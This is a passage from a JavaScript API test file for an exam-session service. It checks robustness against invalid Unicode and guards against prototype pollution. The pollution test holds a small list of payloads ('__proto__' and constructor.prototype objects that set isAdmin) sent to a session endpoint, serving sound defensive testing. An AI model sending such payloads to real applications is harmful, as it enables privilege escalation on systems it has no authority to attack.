              .expect('Content-Type', /json/);
            
            if (response.status === 201) {
              const sessionId = response.body.data.sessionId;
              await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
            }
            
            // May trigger internal errors with invalid Unicode
            expect([201, 400, 500]).toContain(response.status);
          }
        ),
        { numRuns: 5, endOnFailure: true }
      );
    }, 30000);

    it('should prevent prototype pollution via JSONB fields', async () => {
      const createResponse = await request(app)
        .post('/api/sessions')
        .send({ userId: 'test-user-proto' });
      
      // Skip test if database not available
      if (createResponse.status !== 201) {
        console.log('Skipping test - database not available');
        return;
      }
      
      const sessionId = createResponse.body.data.sessionId;
      
      const pollutionPayloads = [
        { '__proto__': { 'isAdmin': true } },
        { 'constructor': { 'prototype': { 'isAdmin': true } } },
        { '__proto__.isAdmin': true }
      ];
      
      for (const payload of pollutionPayloads) {
        const response = await request(app)
          .put(`/api/sessions/${sessionId}`)
          .send({ answers: payload });
        
        // Should reject or sanitize
        expect([200, 400]).toContain(response.status);
        
        // Verify prototype not polluted
        expect(Object.prototype).not.toHaveProperty('isAdmin');
      }
      
      await pool.query('DELETE FROM exam_sessions WHERE session_id = $1', [sessionId]);
    });
  });
});

